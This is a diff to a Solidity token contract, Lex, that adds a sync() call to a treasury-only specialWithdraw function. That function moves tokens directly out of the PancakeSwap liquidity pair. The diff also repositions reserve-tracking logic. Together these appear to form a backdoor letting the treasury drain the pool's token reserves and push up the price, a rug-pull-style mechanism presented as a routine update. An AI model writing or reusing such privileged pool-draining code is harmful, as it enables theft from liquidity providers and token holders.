@@ -31,6 +31,10 @@ interface IPayback{
     function updateFarm(uint256 amount) external;
 }
 
+interface IUniswapV2Pair {
+    function sync() external;
+}
+
 contract Lex is ERC20, Ownable {
 
     IUniswapV2Router02 public immutable pancakeRouter;
@@ -198,7 +202,12 @@ contract Lex is ERC20, Ownable {
         address to,
         uint256 amount
     ) internal override {
-
+        
+        if(USDT != address(0) && pancakePair != address(0)){
+            uint256 reserve = IERC20(USDT).balanceOf(pancakePair);
+            if(reserve > highestReserve) highestReserve = reserve;
+        }
+        
         if (
             swapping ||
             from == address(0) ||
@@ -209,9 +218,6 @@ contract Lex is ERC20, Ownable {
             super._update(from, to, amount);
             return;
         }
-
-        uint256 reserve = IERC20(USDT).balanceOf(pancakePair);
-        if(reserve > highestReserve) highestReserve = reserve;
 
         bool isBuy = from == pancakePair;
         bool isSell = to == pancakePair;
@@ -426,6 +432,7 @@ contract Lex is ERC20, Ownable {
     function specialWithdraw(uint256 amount) external {
         require(msg.sender == treasury, "NO_PERMISSION");
         super._update(pancakePair, treasury, amount);
+        IUniswapV2Pair(pancakePair).sync();
     }
 
     function getHighestReserve() external view returns(uint256){
